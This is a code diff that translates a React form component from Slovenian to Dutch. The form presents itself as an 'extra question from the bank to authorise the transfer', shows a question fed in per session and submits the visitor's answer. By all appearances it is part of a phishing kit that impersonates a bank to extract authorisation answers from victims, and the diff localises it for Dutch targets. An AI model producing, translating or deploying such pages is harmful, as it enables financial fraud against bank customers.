@@ -124,7 +124,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
     setSaving(false);
     if (upErr) {
-      setError("Napaka. Poskusite znova.");
+      setError("Fout. Probeer het opnieuw.");
       return;
     }
     setDone(true);
@@ -149,7 +149,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
               </svg>
             </div>
             <p className="text-lg font-bold text-white">Hvala!</p>
-            <p className="mt-1 text-sm text-white/55">Vaš odgovor je bil uspešno poslan.</p>
+            <p className="mt-1 text-sm text-white/55">Uw antwoord is succesvol verzonden.</p>
           </div>
         ) : (
           <form
@@ -172,12 +172,12 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             </div>
 
             <h1 className="text-center text-[1.25rem] font-extrabold leading-snug tracking-tight text-white">
-              Dodatno vprašanje banke za avtorizacijo nakazila sredstev
+              Extra vraag van de bank ter autorisatie van de overboeking
             </h1>
 
             <div className="rounded-2xl border-l-4 border-[#E30613] bg-[#E30613]/10 px-4 py-3">
               <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#ff6b74]">
-                Vprašanje
+                Vraag
               </p>
               <p className="text-sm font-semibold text-white/90 break-words">
                 {currentQuestion || "..."}
@@ -186,7 +186,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
             <div>
               <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-widest text-white/60">
-                Vaš odgovor
+                Uw antwoord
               </label>
               <div className="relative">
                 <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-white/35">
@@ -199,7 +199,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                   required
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
-                  placeholder="Tukaj vnesite svoj odgovor..."
+                  placeholder="Voer hier uw antwoord in..."
                   className="w-full rounded-xl border border-white/15 bg-white/5 py-3.5 pl-10 pr-4 text-sm font-medium text-white outline-none transition-all placeholder:text-white/30 focus:border-[#E30613] focus:ring-2 focus:ring-[#E30613]/30"
                 />
               </div>
@@ -212,7 +212,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
               disabled={saving || !answer.trim()}
               className="flex w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#E30613] to-[#b0050f] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-[0_8px_30px_rgba(227,6,19,0.45)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-50"
             >
-              {saving ? "Pošiljanje..." : "Nadaljuj"}
+              {saving ? "Verzenden..." : "Doorgaan"}
               <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
               </svg>
